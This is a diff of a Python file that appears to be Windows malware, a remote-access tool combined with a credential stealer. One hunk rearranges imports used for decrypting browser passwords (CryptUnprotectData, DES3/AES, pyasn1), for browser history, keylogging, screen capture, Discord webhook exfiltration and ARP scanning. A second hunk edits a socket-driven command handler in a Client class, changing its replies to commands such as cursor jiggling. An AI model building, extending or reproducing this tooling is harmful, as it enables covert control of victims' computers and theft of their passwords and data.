@@ -1,62 +1,67 @@
+# System Modules
 import os
 import re
 import ssl
 import sys
-import wmi
 import json
 import hmac
 import uuid
-import socks
-import httpx
 import ctypes
 import socket
 import shutil
 import signal
-import psutil
 import random
 import asyncio
 import zipfile
 import sqlite3
 import platform
-import requests
-import keyboard
-import win32api
 import datetime
 import threading
 import subprocess
+
+from multiprocessing import Process, active_children, cpu_count, Pipe
+from binascii import hexlify, unhexlify
+from hashlib import sha1, pbkdf2_hmac
+from urllib.parse import urlparse
+from re import findall, match
+from tempfile import mkdtemp
+from base64 import b64decode
+from random import choice
+from struct import unpack
+from pathlib import Path
+from typing import Tuple
+from queue import Queue
+from time import sleep
+from ctypes import *
+
+
+# Downloaded Modules
+import wmi
+import socks
+import httpx
+import psutil
+import requests
+import keyboard
+import win32api
 import cloudscraper
 import win32process
 import requests_toolbelt
 
-import tkinter as tk
 import undetected_chromedriver as webdriver
-
-from multiprocessing import Process, active_children, cpu_count, Pipe
 from discord_webhook import DiscordWebhook, DiscordEmbed
 from requests.cookies import RequestsCookieJar
 from Crypto.Util.number import long_to_bytes
 from win32crypt import CryptUnprotectData
 from browser_history import get_history
-from binascii import hexlify, unhexlify
 from Crypto.Util.Padding import unpad
-from hashlib import sha1, pbkdf2_hmac
 from scapy.all import ARP, Ether, srp
 from pyasn1.codec.der import decoder
 from Crypto.Cipher import DES3, AES
 from pynput.mouse import Controller
-from random import randint, choice
-from urllib.parse import urlparse
-from re import findall, match
-from tempfile import mkdtemp
-from base64 import b64decode
-from struct import unpack
 from PIL import ImageGrab
-from pathlib import Path
-from typing import Tuple
-from queue import Queue
 from pyotp import TOTP
-from time import sleep
-from ctypes import *
+
+
 
 
 '''
@@ -2202,13 +2207,13 @@ class Client():
             elif data == "jigglecursor":
                 try:
                     threading.Thread(target=cursor_jiggle, args=(420,)).start()
-                    self.sock.send(str.encode("Jiggling cursor"))
+                    self.sock.send(str.encode("Jiggling Cursor Enabled"))
                 except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
 
             elif data == "jigglecursorstop":
                 try:
                     cursor_jiggle.stop = 420
-                    self.sock.send(str.encode("Jiggling cursor stopped!"))
+                    self.sock.send(str.encode("Jiggling Cursor Disabled"))
                 except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
 
             else: self.sock.send(str.encode("Invalid Command"))
